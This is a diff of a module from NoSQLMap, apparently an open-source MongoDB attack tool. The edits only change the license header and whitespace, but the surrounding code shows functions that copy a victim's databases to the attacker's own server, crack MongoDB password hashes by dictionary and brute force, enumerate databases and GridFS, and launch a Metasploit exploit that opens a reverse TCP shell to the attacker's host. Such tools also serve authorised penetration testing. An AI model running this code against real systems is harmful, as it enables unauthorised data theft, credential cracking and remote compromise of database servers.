@@ -1,17 +1,7 @@
 #!/usr/bin/python
-#NoSQLMap Copyright 2016 Russell Butturini
-#This program is free software: you can redistribute it and/or modify
-# it under the terms of the GNU General Public License as published by
-#the Free Software Foundation, either version 3 of the License, or
-#(at your option) any later version.
+# NoSQLMap Copyright 2012-2017 NoSQLMap Development team
+# See the file 'doc/COPYING' for copying permission
 
-#This program is distributed in the hope that it will be useful,
-#but WITHOUT ANY WARRANTY; without even the implied warranty of
-#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-#GNU General Public License for more details.
-
-#You should have received a copy of the GNU General Public License
-#along with this program.  If not, see <http://www.gnu.org/licenses/>.
 import pymongo
 import urllib
 import json
@@ -22,10 +12,12 @@ import subprocess
 from hashlib import md5
 import os
 
+
 global yes_tag
 global no_tag
 yes_tag = ['y', 'Y']
 no_tag = ['n', 'N']
+
 
 def netAttacks(target, dbPort, myIP, myPort):
     print "DB Access attacks (MongoDB)"
@@ -33,7 +25,7 @@ def netAttacks(target, dbPort, myIP, myPort):
     mgtOpen = False
     webOpen = False
     mgtSelect = True
-    #This is a global for future use with other modules; may change
+    # This is a global for future use with other modules; may change
     global dbList
     dbList = []
 
@@ -70,7 +62,7 @@ def netAttacks(target, dbPort, myIP, myPort):
 
 
     mgtUrl = "http://" + target + ":28017"
-    #Future rev:  Add web management interface parsing
+    # Future rev:  Add web management interface parsing
 
     try:
         mgtRespCode = urllib.urlopen(mgtUrl).getcode()
@@ -138,6 +130,7 @@ def netAttacks(target, dbPort, myIP, myPort):
             if attack == "6":
                 return
 
+
 def stealDBs(myDB,victim,mongoConn):
     dbList = mongoConn.database_names()
     dbLoot = True
@@ -161,7 +154,7 @@ def stealDBs(myDB,victim,mongoConn):
             break
 
     try:
-        #Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
+        # Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
         dbNeedCreds = raw_input("Does this database require credentials (y/n)? ")
         myDBConn = pymongo.MongoClient(myDB, 27017)
         if dbNeedCreds in no_tag:
@@ -195,6 +188,7 @@ def stealDBs(myDB,victim,mongoConn):
             raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
             return
 
+
 def passCrack (user, encPass):
     select = True
     print "Select password cracking method: "
@@ -217,12 +211,14 @@ def passCrack (user, encPass):
             return
     return
 
+
 def gen_pass(user, passw, hashVal):
     if md5(user + ":mongo:" + str(passw)).hexdigest() == hashVal:
         print "Found - " + user + ":" + passw
         return True
     else:
         return False
+
 
 def dict_pass(user,key):
     loadCheck = False
@@ -245,8 +241,10 @@ def dict_pass(user,key):
             break
     return
 
+
 def genBrute(chars, maxLen):
     return (''.join(candidate) for candidate in itertools.chain.from_iterable(itertools.product(chars, repeat=i) for i in range(1, maxLen + 1)))
+
 
 def brute_pass(user,key):
     charSel = True
@@ -287,6 +285,7 @@ def brute_pass(user,key):
             break
     return
 
+
 def getPlatInfo (mongoConn):
     print "Server Info:"
     print "MongoDB Version: " + mongoConn.server_info()['version']
@@ -294,6 +293,7 @@ def getPlatInfo (mongoConn):
     print "Platform: " + str(mongoConn.server_info()['bits']) + " bit"
     print "\n"
     return
+
 
 def enumDbs (mongoConn):
     try:
@@ -333,6 +333,7 @@ def enumDbs (mongoConn):
     print "\n"
     return
 
+
 def msfLaunch():
     try:
         proc = subprocess.call("msfcli exploit/linux/misc/mongod_native_helper RHOST=" + str(victim) +" DB=local PAYLOAD=linux/x86/shell/reverse_tcp LHOST=" + str(myIP) + " LPORT="+ str(myPort) + " E", shell=True)
@@ -341,6 +342,7 @@ def msfLaunch():
         print "Something went wrong.  Make sure Metasploit is installed and path is set, and all options are defined."
     raw_input("Press enter to continue...")
     return
+
 
 def enumGrid (mongoConn):
     try:
@@ -360,6 +362,7 @@ def enumGrid (mongoConn):
         print "Error:  Couldn't enumerate GridFS.  The provided credentials may not have rights."
 
     return
+
 
 def mongoScan(ip,port,pingIt):
 
